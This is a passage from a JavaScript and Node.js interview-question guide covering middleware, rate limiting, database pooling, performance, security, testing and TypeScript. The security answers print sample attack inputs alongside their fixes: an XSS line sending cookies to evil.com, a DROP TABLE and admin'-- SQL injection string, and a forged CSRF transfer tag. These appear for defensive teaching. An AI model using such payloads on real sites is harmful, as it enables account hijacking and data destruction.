An API needed authentication, rate limiting, request logging, and CORS on all routes. The developer was copying the same code to every route handler, creating duplication and maintenance issues. Converting to middleware allowed applying all these concerns once at the app level. Adding new routes automatically got all the middleware, and changes only needed to be made in one place.

#### Example Code
```js
// Middleware function signature:
function middleware(req, res, next) {
  // Do something with req/res
  next();  // Call next() to continue to next middleware
}

// BUGGY - duplicated code in every route:
app.get('/users', (req, res) => {
  // Check auth
  if (!req.headers.authorization) {
    return res.status(401).send('Unauthorized');
  }
  // Log request
  console.log(`${req.method} ${req.path}`);
  // Parse body
  const body = JSON.parse(req.body);
  // Handle route
  res.json({ users: [] });
});

app.get('/posts', (req, res) => {
  // Same code duplicated!
  if (!req.headers.authorization) {
    return res.status(401).send('Unauthorized');
  }
  // ...
});

// FIX - use middleware:
// Authentication middleware:
function authenticate(req, res, next) {
  if (!req.headers.authorization) {
    return res.status(401).send('Unauthorized');
  }
  req.user = parseToken(req.headers.authorization);
  next();
}

// Logging middleware:
function logger(req, res, next) {
  console.log(`${req.method} ${req.path} - ${new Date()}`);
  next();
}

// Apply to all routes:
app.use(logger);
app.use(express.json());  // Built-in body parser
app.use(authenticate);

// Routes are now clean:
app.get('/users', (req, res) => {
  // req.user is available from authenticate middleware
  res.json({ users: [] });
});

app.get('/posts', (req, res) => {
  res.json({ posts: [] });
});

// Apply to specific routes:
app.post('/admin/users', authenticate, adminOnly, (req, res) => {
  // Only runs if authenticate and adminOnly pass
});
```

---

### Question 58: How do you implement rate limiting in Node.js?

#### Definition
Rate limiting is like a bouncer at a club - it limits how many requests a client can make in a certain time period. This prevents abuse, DDoS attacks, and ensures fair resource usage. You track requests per IP address or user, and block or throttle requests that exceed the limit. It's like saying "you've had enough, wait a bit before asking again."

#### Real-World Scenario / Case Study
An API was being abused by a single client making 10,000 requests per minute, causing the server to crash and affecting all users. The API had no rate limiting. Implementing rate limiting with `express-rate-limit` limited each IP to 100 requests per 15 minutes. This stopped the abuse and stabilized the service. Legitimate users were unaffected, but abusive clients were blocked.

#### Example Code
```js
// Manual rate limiting:
const requestCounts = new Map();

function rateLimit(req, res, next) {
  const ip = req.ip;
  const now = Date.now();
  const windowMs = 15 * 60 * 1000;  // 15 minutes
  const maxRequests = 100;
  
  if (!requestCounts.has(ip)) {
    requestCounts.set(ip, { count: 1, resetTime: now + windowMs });
    return next();
  }
  
  const record = requestCounts.get(ip);
  
  if (now > record.resetTime) {
    // Reset window
    record.count = 1;
    record.resetTime = now + windowMs;
    return next();
  }
  
  if (record.count >= maxRequests) {
    return res.status(429).json({ error: 'Too many requests' });
  }
  
  record.count++;
  next();
}

app.use(rateLimit);

// Better - use express-rate-limit:
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,  // Limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP',
  standardHeaders: true,  // Return rate limit info in headers
  legacyHeaders: false,
});

app.use('/api/', limiter);

// Different limits for different routes:
const strictLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 5,  // 5 requests per minute
});

app.post('/login', strictLimiter, (req, res) => {
  // Stricter limit for login attempts
});

// Using Redis for distributed rate limiting:
const RedisStore = require('rate-limit-redis');
const redis = require('redis');
const client = redis.createClient();

const limiter = rateLimit({
  store: new RedisStore({
    client: client,
    prefix: 'rl:',
  }),
  windowMs: 15 * 60 * 1000,
  max: 100,
});

// Works across multiple server instances
```

---

### Question 59: How do you handle database connections in Node.js?

#### Definition
Database connections are expensive to create - like building a bridge every time you want to cross a river. Instead, you create a connection pool - a group of ready-to-use connections that you borrow when needed and return when done. This is much faster than creating new connections for each query. You also need to handle connection errors, retries, and properly close connections when the app shuts down.

#### Real-World Scenario / Case Study
A Node.js app was creating a new database connection for every API request, causing connection limit errors and slow performance. The database had a 100 connection limit, but the app was trying to create thousands. Implementing a connection pool with a maximum of 20 connections fixed the issue. Requests now reused existing connections, improving performance 10x and eliminating connection errors.

#### Example Code
```js
// BUGGY - new connection for every request:
app.get('/users', async (req, res) => {
  const connection = await mysql.createConnection({
    host: 'localhost',
    user: 'user',
    password: 'pass',
    database: 'mydb'
  });
  
  const users = await connection.query('SELECT * FROM users');
  await connection.end();  // Closes connection
  // Slow and hits connection limits
});

// FIX - use connection pool:
const mysql = require('mysql2/promise');

const pool = mysql.createPool({
  host: 'localhost',
  user: 'user',
  password: 'pass',
  database: 'mydb',
  waitForConnections: true,
  connectionLimit: 10,  // Max connections in pool
  queueLimit: 0,
  enableKeepAlive: true,
  keepAliveInitialDelay: 0,
});

app.get('/users', async (req, res) => {
  try {
    const [users] = await pool.query('SELECT * FROM users');
    res.json(users);
    // Connection automatically returned to pool
  } catch (error) {
    console.error('Database error:', error);
    res.status(500).json({ error: 'Database error' });
  }
});

// With MongoDB (Mongoose):
const mongoose = require('mongoose');

// Connection options:
const options = {
  maxPoolSize: 10,  // Maximum connections
  minPoolSize: 2,   // Minimum connections
  serverSelectionTimeoutMS: 5000,
  socketTimeoutMS: 45000,
};

mongoose.connect('mongodb://localhost/mydb', options);

// Handle connection events:
mongoose.connection.on('connected', () => {
  console.log('MongoDB connected');
});

mongoose.connection.on('error', (error) => {
  console.error('MongoDB error:', error);
});

mongoose.connection.on('disconnected', () => {
  console.log('MongoDB disconnected');
});

// Graceful shutdown:
process.on('SIGINT', async () => {
  await mongoose.connection.close();
  process.exit(0);
});
```

---

### Question 60: What is the difference between `setImmediate`, `setTimeout`, and `process.nextTick`?

#### Definition
These are different ways to schedule code to run later in Node.js. `process.nextTick` runs immediately after the current operation, before anything else - it's like cutting in line. `setImmediate` runs in the next iteration of the event loop - it's like taking a number and waiting your turn. `setTimeout` runs after a specified delay - it's like setting an alarm. The order matters for performance and correctness.

#### Real-World Scenario / Case Study
A data processing system was processing items in the wrong order, causing race conditions. The code used `setTimeout` with 0ms delay, expecting immediate execution, but `process.nextTick` callbacks ran first, changing the processing order. Understanding the execution order helped fix the race condition and ensure correct processing sequence.

#### Example Code
```js
// Execution order:
console.log('1');

setTimeout(() => console.log('2'), 0);
setImmediate(() => console.log('3'));
process.nextTick(() => console.log('4'));

console.log('5');

// Output: 1, 5, 4, 2, 3
// nextTick runs before setTimeout/setImmediate

// process.nextTick - highest priority:
process.nextTick(() => {
  console.log('This runs before any I/O');
});

// setImmediate - next event loop iteration:
setImmediate(() => {
  console.log('This runs in the next iteration');
});

// setTimeout - after delay:
setTimeout(() => {
  console.log('This runs after delay');
}, 0);

// REAL USE CASE - recursive nextTick (can starve I/O):
function recursiveNextTick() {
  process.nextTick(() => {
    // Do work
    recursiveNextTick();  // Can block event loop!
  });
}

// FIX - use setImmediate for recursion:
function recursiveSetImmediate() {
  setImmediate(() => {
    // Do work
    recursiveSetImmediate();  // Allows I/O between iterations
  });
}

// BUGGY - wrong timing:
function processData(data, callback) {
  process.nextTick(() => {
    callback(data);  // Runs before I/O completes
  });
}

// FIX:
function processData(data, callback) {
  setImmediate(() => {
    callback(data);  // Runs after I/O
  });
}
```

---

## Performance & Optimization

### Question 61: How do you identify and fix performance bottlenecks in JavaScript?

#### Definition
Performance bottlenecks are like traffic jams - they slow everything down. To find them, you use profiling tools that show where your code spends the most time, like a stopwatch for each function. Common bottlenecks: inefficient algorithms (O(n²) when O(n) is possible), unnecessary re-renders, memory leaks, blocking operations, or too many API calls. Once identified, you optimize the slow parts.

#### Real-World Scenario / Case Study
A dashboard was taking 10+ seconds to load. Using Chrome DevTools Performance profiler, the team found that a single function was taking 8 seconds - it was doing O(n²) nested loops on 10,000 items. Optimizing to O(n) using a Map reduced the time to 50ms. The profiler also revealed unnecessary re-renders that were fixed with React.memo.

#### Example Code
```js
// BUGGY - O(n²) algorithm:
function findDuplicates(arr1, arr2) {
  const duplicates = [];
  for (let i = 0; i < arr1.length; i++) {
    for (let j = 0; j < arr2.length; j++) {
      if (arr1[i] === arr2[j]) {
        duplicates.push(arr1[i]);
      }
    }
  }
  return duplicates;  // O(n²) - slow for large arrays
}

// OPTIMIZED - O(n) using Set:
function findDuplicates(arr1, arr2) {
  const set2 = new Set(arr2);  // O(n)
  return arr1.filter(item => set2.has(item));  // O(n)
  // Total: O(n) instead of O(n²)
}

// Profiling with console.time:
console.time('slowOperation');
expensiveOperation();
console.timeEnd('slowOperation');  // Shows execution time

// Using Performance API:
const start = performance.now();
expensiveOperation();
const end = performance.now();
console.log(`Took ${end - start} milliseconds`);
```

---

### Question 62: What is debouncing and throttling, and when should you use each?

#### Definition
Debouncing is like waiting for someone to stop talking before responding - you wait for a pause, then act. Throttling is like only allowing one question per minute - you limit how often something can happen. Debouncing is for "wait until they're done" (like search as you type). Throttling is for "only allow this many times" (like scroll events). Both prevent too many function calls.

#### Real-World Scenario / Case Study
A search feature was making API calls on every keystroke - typing "javascript" made 10 API calls. This overwhelmed the server and showed flickering results. Debouncing waited 300ms after typing stopped before searching, reducing calls from 10 to 1. A scroll handler was firing 100+ times per second, causing performance issues. Throttling limited it to once per 100ms, fixing the lag.

#### Example Code
```js
// Debounce - wait for pause:
function debounce(func, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => func.apply(this, args), delay);
  };
}

// Usage - search input:
const searchInput = document.getElementById('search');
const debouncedSearch = debounce((query) => {
  fetch(`/api/search?q=${query}`);
}, 300);  // Wait 300ms after typing stops

searchInput.addEventListener('input', (e) => {
  debouncedSearch(e.target.value);
  // Only searches after user stops typing for 300ms
});

// Throttle - limit frequency:
function throttle(func, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      func.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

// Usage - scroll handler:
const throttledScroll = throttle(() => {
  updateScrollPosition();
}, 100);  // Max once per 100ms

window.addEventListener('scroll', throttledScroll);

// REAL USE CASE - resize handler:
const handleResize = throttle(() => {
  recalculateLayout();
}, 250);  // Only recalculate max once per 250ms

window.addEventListener('resize', handleResize);
```

---

### Question 63: How do you optimize bundle size in JavaScript applications?

#### Definition
Bundle size is like the weight of your luggage - the heavier it is, the slower it loads. To reduce it, you remove unused code (tree-shaking), split code into smaller chunks (code splitting), compress it (minification), and only load what's needed when it's needed (lazy loading). It's like packing only what you need and loading heavy items separately.

#### Real-World Scenario / Case Study
A React app had a 5MB JavaScript bundle, taking 15+ seconds to load on slow connections. Users abandoned the site. Analysis showed 80% of the code was unused libraries. Tree-shaking removed dead code, code splitting created separate bundles for each route, and lazy loading deferred non-critical code. The initial bundle dropped to 200KB, loading in under 2 seconds.

#### Example Code
```js
// BUGGY - imports entire library:
import _ from 'lodash';  // Imports entire 70KB library
const result = _.debounce(myFunction, 300);

// FIX - import only what you need:
import debounce from 'lodash/debounce';  // Only imports debounce
const result = debounce(myFunction, 300);

// BUGGY - no code splitting:
import HeavyComponent from './HeavyComponent';
// Loaded even if never used

// FIX - lazy loading with React:
import { lazy, Suspense } from 'react';

const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />  // Only loaded when needed
    </Suspense>
  );
}

// Dynamic imports for code splitting:
// Instead of:
import { heavyFunction } from './heavy-module';

// Use:
button.addEventListener('click', async () => {
  const { heavyFunction } = await import('./heavy-module');
  heavyFunction();
  // Module only loaded when button clicked
});

// Webpack code splitting:
const Home = () => import('./pages/Home');
const About = () => import('./pages/About');
// Creates separate chunks for each route
```

---

### Question 64: What is lazy loading and how does it improve performance?

#### Definition
Lazy loading is like ordering food only when you're hungry, not buying everything at once. Instead of loading all code and data immediately, you load it only when needed. This makes the initial page load faster because less code downloads upfront. Images, routes, and components can all be lazy loaded - they're fetched when the user actually needs them.

#### Real-World Scenario / Case Study
An e-commerce site loaded all product images on the homepage, causing 20MB of images to download before users could interact. On slow connections, this took 30+ seconds. Implementing lazy loading for images below the fold (not visible initially) reduced initial load to 2MB and 3 seconds. Images loaded as users scrolled, improving perceived performance significantly.

#### Example Code
```js
// Lazy loading images:
<img 
  src="placeholder.jpg" 
  data-src="actual-image.jpg" 
  loading="lazy"  // Native browser lazy loading
  alt="Product"
/>

// Or with Intersection Observer:
const images = document.querySelectorAll('img[data-src]');

const imageObserver = new IntersectionObserver((entries, observer) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      img.removeAttribute('data-src');
      observer.unobserve(img);
    }
  });
});

images.forEach(img => imageObserver.observe(img));

// Lazy loading React components:
import { lazy, Suspense } from 'react';

const Dashboard = lazy(() => import('./Dashboard'));
const Settings = lazy(() => import('./Settings'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/settings" element={<Settings />} />
        {/* Components only loaded when route is accessed */}
      </Routes>
    </Suspense>
  );
}

// Lazy loading data:
async function loadUserData(userId) {
  // Only fetch when needed
  const response = await fetch(`/api/users/${userId}`);
  return response.json();
}

// Load on demand:
button.addEventListener('click', async () => {
  const userData = await loadUserData(123);
  displayUserData(userData);
});
```

---

### Question 65: How do you optimize database queries in Node.js applications?

#### Definition
Database queries can be slow if you fetch too much data, don't use indexes, or make too many queries. Optimization means: only select needed columns, use indexes for fast lookups, batch multiple queries, cache frequent queries, and avoid N+1 query problems (making one query per item in a loop). It's like being efficient at a library - know where books are (indexes), only get what you need, and make fewer trips.

#### Real-World Scenario / Case Study
A user profile page was making 50+ database queries to load user data, posts, comments, likes, etc. Each query took 50-100ms, totaling 2.5-5 seconds. The N+1 problem: one query for users, then one query per user for posts, then one per post for comments. Using JOINs and batch queries reduced it to 3 queries (200ms total), improving load time 25x.

#### Example Code
```js
// BUGGY - N+1 query problem:
async function getUsersWithPosts() {
  const users = await db.query('SELECT * FROM users');
  
  for (const user of users) {
    // One query per user - N+1 problem!
    user.posts = await db.query('SELECT * FROM posts WHERE user_id = ?', [user.id]);
  }
  // If 100 users, makes 101 queries!
}

// FIX - use JOIN:
async function getUsersWithPosts() {
  const users = await db.query(`
    SELECT 
      u.*,
      p.id as post_id,
      p.title,
      p.content
    FROM users u
    LEFT JOIN posts p ON u.id = p.user_id
  `);
  // Single query gets everything
}

// BUGGY - fetching unnecessary data:
const users = await db.query('SELECT * FROM users');
// Fetches all columns, even if only need name and email

// FIX - select only needed columns:
const users = await db.query('SELECT id, name, email FROM users');

// BUGGY - no indexes:
const user = await db.query('SELECT * FROM users WHERE email = ?', [email]);
// Slow if email column not indexed

// FIX - add index:
// CREATE INDEX idx_email ON users(email);

// BUGGY - multiple separate queries:
const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);
const posts = await db.query('SELECT * FROM posts WHERE user_id = ?', [id]);
const comments = await db.query('SELECT * FROM comments WHERE user_id = ?', [id]);

// FIX - batch or use transactions:
const [user, posts, comments] = await Promise.all([
  db.query('SELECT * FROM users WHERE id = ?', [id]),
  db.query('SELECT * FROM posts WHERE user_id = ?', [id]),
  db.query('SELECT * FROM comments WHERE user_id = ?', [id])
]);
// Executes in parallel instead of sequentially
```

---

## Security

### Question 66: What is XSS (Cross-Site Scripting) and how do you prevent it?

#### Definition
XSS is like someone sneaking malicious code into your website that runs in other users' browsers. Attackers inject JavaScript that steals cookies, session tokens, or personal data. It happens when you display user input without sanitizing it. Prevention means: escape/encode user input, use Content Security Policy, and never use `innerHTML` with untrusted data. It's like checking packages before letting them into your house.

#### Real-World Scenario / Case Study
A comment system allowed users to post HTML, and the site displayed it with `innerHTML`. An attacker posted a comment with `<script>stealCookies()</script>`. When other users viewed the comment, the script ran in their browsers, stealing their session cookies. The attacker hijacked accounts. Fixing required sanitizing all user input and using `textContent` instead of `innerHTML`.

#### Example Code
```js
// VULNERABLE - XSS attack:
function displayComment(comment) {
  document.getElementById('comments').innerHTML += comment;
  // If comment contains <script>alert('XSS')</script>, it executes!
}

// Attacker can do:
displayComment('<script>document.location="http://evil.com?cookie="+document.cookie</script>');

// FIX 1 - escape HTML:
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function displayComment(comment) {
  const escaped = escapeHtml(comment);
  document.getElementById('comments').innerHTML += escaped;
}

// FIX 2 - use textContent (safer):
function displayComment(comment) {
  const div = document.createElement('div');
  div.textContent = comment;  // Automatically escapes
  document.getElementById('comments').appendChild(div);
}

// FIX 3 - use DOMPurify library:
import DOMPurify from 'dompurify';

function displayComment(comment) {
  const clean = DOMPurify.sanitize(comment);
  document.getElementById('comments').innerHTML += clean;
}

// FIX 4 - Content Security Policy (CSP):
// In HTML head:
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
// Prevents inline scripts and external scripts
```

---

### Question 67: What is CSRF (Cross-Site Request Forgery) and how do you prevent it?

#### Definition
CSRF is like someone tricking you into clicking a button that does something you didn't intend - like transferring money from your account. The attacker makes a request from your browser using your session, so the server thinks it's you. Prevention uses tokens that only your real site knows, or checking the request origin. It's like a secret handshake that proves the request came from you, not an imposter.

#### Real-World Scenario / Case Study
A banking site allowed money transfers via GET requests with just a user ID. An attacker created a website with an image tag pointing to the transfer URL. When logged-in users visited the attacker's site, their browser automatically made the transfer request. The bank thought it was legitimate because the user was logged in. Adding CSRF tokens prevented this attack.

#### Example Code
```js
// VULNERABLE - no CSRF protection:
app.post('/transfer', (req, res) => {
  const { amount, toAccount } = req.body;
  // No verification - attacker can forge request
  transferMoney(req.user.id, toAccount, amount);
});

// Attacker's malicious site:
// <img src="https://bank.com/transfer?to=attacker&amount=1000">
// When user visits, browser makes request with their cookies

// FIX 1 - CSRF tokens:
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

app.get('/form', (req, res) => {
  res.render('transfer-form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // Token validated automatically
  const { amount, toAccount } = req.body;
  transferMoney(req.user.id, toAccount, amount);
});

// In form:
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <!-- Token must match server's token -->
</form>

// FIX 2 - SameSite cookies:
app.use(session({
  cookie: {
    sameSite: 'strict',  // Cookie only sent with same-site requests
    secure: true,        // Only over HTTPS
    httpOnly: true       // Not accessible via JavaScript
  }
}));

// FIX 3 - check Origin/Referer headers:
app.post('/transfer', (req, res) => {
  const origin = req.get('Origin') || req.get('Referer');
  if (!origin || !origin.startsWith('https://bank.com')) {
    return res.status(403).send('Forbidden');
  }
  // Process request
});
```

---

### Question 68: How do you securely store and handle passwords?

#### Definition
Never store passwords in plain text - it's like writing your house key code on a post-it note. Instead, hash them (one-way encryption) so even if someone steals the database, they can't get the original passwords. Use bcrypt or similar, which is slow by design to prevent brute force attacks. Also use salt (random data) to make each hash unique, even for the same password.

#### Real-World Scenario / Case Study
A company stored passwords in plain text. When their database was breached, attackers got all passwords and tried them on other sites (credential stuffing). Many users reused passwords, so accounts were compromised elsewhere. The company had to force password resets for all users and implement proper hashing. Using bcrypt with salt prevented future breaches from exposing passwords.

#### Example Code
```js
const bcrypt = require('bcrypt');

// VULNERABLE - plain text storage:
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  await db.query('INSERT INTO users (username, password) VALUES (?, ?)', 
    [username, password]);  // Stored in plain text!
});

// FIX - hash with bcrypt:
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  
  // Hash password with salt (10 rounds = good balance of security/speed)
  const hashedPassword = await bcrypt.hash(password, 10);
  
  await db.query('INSERT INTO users (username, password) VALUES (?, ?)', 
    [username, hashedPassword]);
});

// Login - verify password:
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [username]);
  if (users.length === 0) {
    return res.status(401).send('Invalid credentials');
  }
  
  const user = users[0];
  const isValid = await bcrypt.compare(password, user.password);
  
  if (!isValid) {
    return res.status(401).send('Invalid credentials');
  }
  
  // Create session
  req.session.userId = user.id;
  res.send('Logged in');
});

// NEVER do this:
// - Store passwords in plain text
// - Use MD5 or SHA1 (too fast, vulnerable to rainbow tables)
// - Hash without salt
// - Log passwords
// - Send passwords in URLs or query strings
```

---

### Question 69: What is SQL injection and how do you prevent it?

#### Definition
SQL injection is like someone adding malicious code to a form that changes your database query. Instead of searching for "John", they might input `'; DROP TABLE users; --` which could delete your entire users table. Prevention means: never concatenate user input into SQL queries, always use parameterized queries (prepared statements), and validate/sanitize input. It's like using a safe instead of leaving your valuables in an open box.

#### Real-World Scenario / Case Study
A login form built SQL queries by concatenating strings: `"SELECT * FROM users WHERE username = '" + username + "'"`. An attacker entered `admin'--` as the username, which commented out the password check and logged them in as admin. The attacker then accessed sensitive data. Fixing required using parameterized queries everywhere, which took weeks to audit and update 200+ queries.

#### Example Code
```js
// VULNERABLE - string concatenation:
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // DANGEROUS - SQL injection possible!
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  db.query(query, (err, results) => {
    // Attacker can input: username = "admin'--"
    // Query becomes: SELECT * FROM users WHERE username = 'admin'--' AND password = ''
    // -- comments out rest of query, bypassing password check!
  });
});

// FIX - parameterized queries (prepared statements):
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Safe - parameters are escaped automatically
  const [users] = await db.query(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]  // Parameters, not concatenated
  );
  
  // Even if attacker inputs "admin'--", it's treated as literal string
});

// With different libraries:
// MySQL:
const [users] = await db.query('SELECT * FROM users WHERE id = ?', [userId]);

// PostgreSQL:
const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);

// MongoDB (NoSQL injection prevention):
// BAD:
db.users.find({ username: req.body.username });  // If input is object, could inject

// GOOD:
const username = String(req.body.username);  // Ensure it's a string
db.users.find({ username: username });
```

---

### Question 70: How do you implement authentication and authorization securely?

#### Definition
Authentication is "who are you?" (login) - verifying identity. Authorization is "what can you do?" (permissions) - checking if you're allowed to do something. Secure implementation uses: hashed passwords, secure session tokens (not predictable), HTTPS only, token expiration, and proper permission checks on every request. It's like having ID (authentication) and a badge showing your access level (authorization).

#### Real-World Scenario / Case Study
An API used sequential user IDs as session tokens (1, 2, 3...). An attacker guessed other users' tokens and accessed their accounts. The system also didn't check permissions - once logged in, users could access any endpoint. Implementing JWT tokens with expiration and proper authorization middleware fixed both issues. Each request now verified both identity and permissions.

#### Example Code
```js
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// Authentication - login:
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [username]);
  if (users.length === 0) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const user = users[0];
  const isValid = await bcrypt.compare(password, user.password);
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Create JWT token:
  const token = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  res.json({ token });
});

// Authorization middleware:
function requireAuth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;  // Attach user info to request
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Role-based authorization:
function requireRole(role) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

// Usage:
app.get('/admin/users', requireAuth, requireRole('admin'), (req, res) => {
  // Only admins can access
});

app.get('/profile', requireAuth, (req, res) => {
  // Any authenticated user can access
  res.json({ userId: req.user.userId });
});

// Resource-based authorization:
async function requireOwnership(req, res, next) {
  const resource = await db.query('SELECT * FROM posts WHERE id = ?', [req.params.id]);
  
  if (resource.userId !== req.user.userId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Not authorized' });
  }
  
  next();
}

app.delete('/posts/:id', requireAuth, requireOwnership, (req, res) => {
  // User can only delete their own posts (unless admin)
});
```

---

## Testing & Quality

### Question 71: What is the difference between unit tests, integration tests, and E2E tests?

#### Definition
Unit tests check individual functions in isolation - like testing a single gear in a machine. Integration tests check how multiple parts work together - like testing gears working together. E2E (end-to-end) tests check the entire user flow - like testing the whole machine from start to finish. Each catches different types of bugs and has different costs and speeds.

#### Real-World Scenario / Case Study
A team only had E2E tests, which took 2 hours to run and were flaky. When tests failed, it was unclear which component broke. Adding unit tests (fast, run in seconds) caught bugs early. Integration tests verified API endpoints worked correctly. E2E tests remained for critical user flows. This testing pyramid (many unit, some integration, few E2E) improved development speed and bug detection.

#### Example Code
```js
// Unit test - tests function in isolation:
function calculateTotal(items) {
  return items.reduce((sum, item) => sum + item.price, 0);
}

// Unit test with Jest:
describe('calculateTotal', () => {
  it('should sum item prices', () => {
    const items = [{ price: 10 }, { price: 20 }, { price: 30 }];
    expect(calculateTotal(items)).toBe(60);
  });
  
  it('should return 0 for empty array', () => {
    expect(calculateTotal([])).toBe(0);
  });
});

// Integration test - tests multiple components together:
describe('User API', () => {
  it('should create and retrieve user', async () => {
    // Tests database + API together
    const user = await createUser({ name: 'John' });
    const retrieved = await getUser(user.id);
    expect(retrieved.name).toBe('John');
  });
});

// E2E test - tests full user flow:
describe('User Registration Flow', () => {
  it('should register new user', async () => {
    await page.goto('http://localhost:3000');
    await page.click('button[data-testid="register"]');
    await page.fill('input[name="email"]', 'test@example.com');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');
    await expect(page.locator('.success-message')).toBeVisible();
  });
});
```

---

### Question 72: How do you mock dependencies in JavaScript tests?

#### Definition
Mocking is like using a stunt double in movies - you replace real dependencies (APIs, databases, file systems) with fake versions that you control. This lets you test your code without hitting real services, making tests faster and more reliable. You can control what the mock returns, verify it was called correctly, and test error cases easily.

#### Real-World Scenario / Case Study
Tests were slow (5+ minutes) because they hit real APIs and databases. They also failed when services were down, even though the code was correct. Mocking external dependencies made tests run in seconds and work offline. Mocks also allowed testing error scenarios (like API failures) that were hard to reproduce with real services.

#### Example Code
```js
// Function that depends on external API:
async function getUserData(userId) {
  const response = await fetch(`https://api.example.com/users/${userId}`);
  return response.json();
}

// BUGGY - tests hit real API:
describe('getUserData', () => {
  it('should fetch user data', async () => {
    const user = await getUserData(123);
    expect(user.name).toBe('John');  // Slow, requires internet, flaky
  });
});

// FIX - mock fetch:
global.fetch = jest.fn();

describe('getUserData', () => {
  it('should fetch user data', async () => {
    // Mock the API response
    global.fetch.mockResolvedValueOnce({
      json: async () => ({ id: 123, name: 'John' })
    });
    
    const user = await getUserData(123);
    
    expect(user.name).toBe('John');
    expect(global.fetch).toHaveBeenCalledWith('https://api.example.com/users/123');
  });
  
  it('should handle API errors', async () => {
    global.fetch.mockRejectedValueOnce(new Error('API Error'));
    
    await expect(getUserData(123)).rejects.toThrow('API Error');
  });
});

// Mocking modules with Jest:
// __mocks__/database.js
module.exports = {
  query: jest.fn()
};

// In test:
jest.mock('./database');

const db = require('./database');

test('should query database', async () => {
  db.query.mockResolvedValue([{ id: 1, name: 'John' }]);
  
  const users = await getUsers();
  
  expect(users).toHaveLength(1);
  expect(db.query).toHaveBeenCalledWith('SELECT * FROM users');
});
```

---

### Question 73: What is test coverage and why does it matter?

#### Definition
Test coverage measures how much of your code is tested - like checking how much of a building has security cameras. 100% coverage means every line, branch, and function is tested. High coverage doesn't guarantee quality (you can test the wrong things), but low coverage means you're definitely missing bugs. Aim for meaningful coverage, not just hitting 100% with useless tests.

#### Real-World Scenario / Case Study
A codebase had 30% test coverage. A critical bug in untested code caused a production incident that cost $50k. The team set a 80% coverage goal and wrote tests for all critical paths. Coverage tools helped identify untested code. While reaching 80% took effort, it caught 15+ bugs before production and prevented similar incidents.

#### Example Code
```js
// Function with multiple branches:
function calculateDiscount(price, isMember, hasCoupon) {
  if (isMember && hasCoupon) {
    return price * 0.7;  // 30% off
  } else if (isMember) {
    return price * 0.9;  // 10% off
  } else if (hasCoupon) {
    return price * 0.95;  // 5% off
  }
  return price;  // No discount
}

// LOW COVERAGE - only tests one path:
describe('calculateDiscount', () => {
  it('should apply member discount', () => {
    expect(calculateDiscount(100, true, false)).toBe(90);
  });
  // Only 25% coverage - missing other branches
});

// GOOD COVERAGE - tests all paths:
describe('calculateDiscount', () => {
  it('should apply member + coupon discount', () => {
    expect(calculateDiscount(100, true, true)).toBe(70);
  });
  
  it('should apply member discount', () => {
    expect(calculateDiscount(100, true, false)).toBe(90);
  });
  
  it('should apply coupon discount', () => {
    expect(calculateDiscount(100, false, true)).toBe(95);
  });
  
  it('should return full price for non-members without coupon', () => {
    expect(calculateDiscount(100, false, false)).toBe(100);
  });
  // 100% coverage - all branches tested
});

// Using coverage tools:
// jest --coverage
// Shows:
// - Statement coverage: 100%
// - Branch coverage: 100%
// - Function coverage: 100%
// - Line coverage: 100%
```

---

## TypeScript & Type Safety

### Question 74: What are TypeScript interfaces and types, and when to use each?

#### Definition
Interfaces and types both define the shape of data - like a blueprint for an object. Interfaces are like contracts that classes can implement. Types are more flexible and can represent unions, intersections, and computed types. Interfaces can be extended and merged, while types use intersections. For objects, they're mostly interchangeable, but interfaces are preferred for object shapes that might be extended.

#### Real-World Scenario / Case Study
A team mixed interfaces and types inconsistently, causing confusion. Some used interfaces for everything, others used types. When they needed to extend definitions, interfaces worked better. When they needed union types (string | number), types were required. Standardizing on interfaces for object shapes and types for unions/intersections improved code clarity and maintainability.

#### Example Code
```ts
// Interface - good for object shapes:
interface User {
  id: number;
  name: string;
  email: string;
}

// Can be extended:
